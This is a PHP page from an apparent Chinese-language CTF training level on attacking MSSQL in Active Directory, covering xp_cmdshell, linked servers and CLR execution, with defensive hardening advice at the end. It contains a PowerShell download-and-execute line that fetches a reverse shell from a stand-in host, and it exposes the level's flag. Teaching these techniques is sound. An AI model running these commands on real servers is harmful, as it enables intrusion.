<?php
include_once '../../inc/config.inc.php';
$ACTIVE = array_fill(0, 300, '');
$ACTIVE[250] = 'active open';  // parent menu index
$ACTIVE[287] = 'active';         // this page index
$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';
$correct_flag = 'flag{OSEP_L15_MSSQL_LinkedServer_xp_cmdshell_AD}';
$flag_msg = '';
if (isset($_POST['check_flag'])) {
    if (trim($_POST['user_flag']) === $correct_flag) {
        $_SESSION['OSEP_flags']['flag15'] = true;
        $flag_msg = '<div class="alert alert-success">✅ 通关！MSSQL 深度利用与提权。</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger">❌ Flag 错误。</div>';
    }
}
?>
<style>
/* dark theme with module color */
.ctf-stage-header { background: var(--bg-card); border-radius: 14px; padding: 25px 30px; margin-bottom: 25px; border: 1px solid var(--border-color); box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
.step-box { background:var(--bg-card); border:1px solid var(--border-color); border-radius:12px; padding:24px; margin-bottom:22px; }
.step-title { font-size:16px; font-weight:700; color:var(--text-primary); margin-top:0; margin-bottom:14px; display:flex; align-items:center; gap:8px; }
.step-num { background:linear-gradient(135deg,#6366f1,#4f46e5); color:#fff; width:26px; height:26px; border-radius:6px; display:inline-flex; align-items:center; justify-content:center; font-size:12px; font-weight:800; }
.cmd-box { background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px 18px; font-family: monospace; font-size: 13px; color: var(--text-primary); margin: 12px 0; overflow-x: auto; line-height: 1.8; }
.cmd-box .comment { color:#64748b; }
.cmd-box .flag-text { color:#fbbf24; font-weight:bold; }
.highlight-box { background:rgba(99,102,241,0.08); border:1px solid rgba(99,102,241,0.25); border-radius:8px; padding:14px 18px; margin:12px 0; font-size:13px; color:var(--text-secondary); line-height:1.7; }
.flag-submit-area { background:var(--bg-card); border:2px dashed rgba(99,102,241,0.4); border-radius:12px; padding:24px; margin-top:25px; text-align:center; }
</style>
<div class="main-content"><div class="main-content-inner"><div class="page-content">
    <div class="ctf-stage-header">
        <h3 style="margin:0; font-size:24px; font-weight:700;">Level 15: AD 环境中的 MSSQL 深度利用 <span class="badge badge-warning">350 PTS</span></h3>
        <p style="margin-top:10px; opacity:0.9;">本关卡研究如何利用 MSSQL 在 Active Directory 环境中的信任关系、配置缺陷和功能特性实现提权与横向移动。</p>
    </div>
    
    <?php if($flag_msg) echo $flag_msg; ?>

    <div class="step-box">
        <h4 class="step-title"><span class="step-num">1</span> MSSQL 在 AD 中的信任关系</h4>
        <p>在域环境中，MSSQL 通常使用特定的服务账户（如域服务账户或 <code>NetworkService</code>）运行，并注册有相应的 SPN（Service Principal Name），这使得它成为 Kerberoasting 攻击的常客。</p>
        <p>认证到数据库的账户会被映射到不同的服务器角色（如 <code>sysadmin</code>）或数据库角色（如 <code>db_owner</code>），决定了用户在数据库层面甚至底层操作系统层面的执行权限。</p>
        <div class="highlight-box">如果当前登录的用户在 MSSQL 中被映射为 sysadmin，则可以执行高危存储过程与操作系统命令。</div>
    </div>

    <div class="step-box">
        <h4 class="step-title"><span class="step-num">2</span> xp_cmdshell 启用与利用</h4>
        <p><code>xp_cmdshell</code> 是 MSSQL 提供的扩展存储过程，允许直接执行操作系统命令（默认以 SQL Server 服务账户权限执行）。出于安全考虑，该功能在现代版本中默认禁用。</p>
        <p>拥有 <code>sysadmin</code> 权限的攻击者可以使用 <code>sp_configure</code> 重新启用它。</p>
        <div class="cmd-box">
<span class="comment">-- 启用 xp_cmdshell (需高级选项支持)</span>
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
<span class="comment">-- 执行命令并获取 PowerShell 反弹 Shell</span>
EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://attack.com/shell.ps1'')"'
        </div>
    </div>

    <div class="step-box">
        <h4 class="step-title"><span class="step-num">3</span> 链接服务器（Linked Servers）跳板攻击</h4>
        <p>MSSQL 支持将其他数据库服务器添加为“链接服务器”，从而执行跨服务器的分布式查询。安全隐患在于：</p>
        <ul>
            <li><strong>配置缺陷：</strong>链接可能使用高权限硬编码凭据（或通过模拟），导致在本地是普通用户的攻击者，在目标服务器上成为 sysadmin。</li>
            <li><strong>信任链：</strong>可以是单向或双向，支持多跳（Server A -> Server B -> Server C），从而穿越网段访问内网深处的核心数据库。</li>
        </ul>
        <div class="cmd-box">
<span class="comment">-- 获取 flag</span>
<span class="flag-text">SELECT 'flag{OSEP_L15_MSSQL_LinkedServer_xp_cmdshell_AD}'</span>

<span class="comment">-- 查询链接服务器，并通过 openquery 或 AT 执行跨服务器命令</span>
SELECT * FROM master..sysservers;
EXECUTE ('sp_configure ''show advanced options'', 1; RECONFIGURE') AT [LINKED_DB_SERVER];
        </div>
    </div>

    <div class="step-box">
        <h4 class="step-title"><span class="step-num">4</span> MSSQL UDF / CLR 执行代码</h4>
        <p>如果 <code>xp_cmdshell</code> 无法使用或被严格监控，攻击者可以利用自定义功能：</p>
        <ul>
            <li><strong>UDF（用户定义函数）：</strong>在早期版本或部分环境中，加载恶意 DLL。</li>
            <li><strong>CLR（公共语言运行时）集成：</strong>SQL Server 允许在数据库内执行 .NET 程序集（C#/VB.NET）。攻击者可以编写恶意 CLR 程序集，将其导入数据库并创建自定义存储过程执行。</li>
        </ul>
        <div class="highlight-box">在特定配置下（如 TRUSTWORTHY 属性设为 ON），拥有 <code>db_owner</code> 权限的攻击者可通过 CLR 加载获得系统级别代码执行，甚至变相提升至 sysadmin。</div>
    </div>

    <div class="step-box">
        <h4 class="step-title"><span class="step-num">5</span> 防御建议</h4>
        <div class="highlight-box">
            <strong>加固建议：</strong><br>
            1. <strong>最小权限原则：</strong>不要授予应用账户 <code>sysadmin</code> 角色；为 SQL 服务配置专用、低权限的服务账户。<br>
            2. <strong>功能禁用：</strong>坚决禁用 <code>xp_cmdshell</code> 和 CLR 集成，除非业务有绝对必要。<br>
            3. <strong>链接服务器审计：</strong>审查 <code>sys.servers</code> 配置，避免使用具备高权限的凭据或无条件模拟。<br>
            4. <strong>网络隔离：</strong>不要将 MSSQL（默认 1433 端口）暴露在非受信任网段，通过防火墙限制入站连接。
        </div>
    </div>

    <div class="flag-submit-area">
        <form method="POST" class="form-inline" style="justify-content: center;">
            <div class="form-group">
                <input type="text" name="user_flag" class="form-control" placeholder="输入Flag，例如 flag{...}" style="width: 300px;">
            </div>
            <button type="submit" name="check_flag" class="btn btn-primary" style="background:#6366f1; border-color:#4f46e5; margin-left:10px;">提交验证</button>
        </form>
        <div style="margin-top: 20px;">
            <a href="osep_l14_cred_attack.php" class="btn btn-default">上一关</a>
            <a href="osep_l16_kiosk_escape.php" class="btn btn-default" style="margin-left:10px;">下一关</a>
        </div>
    </div>
</div></div></div>
<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
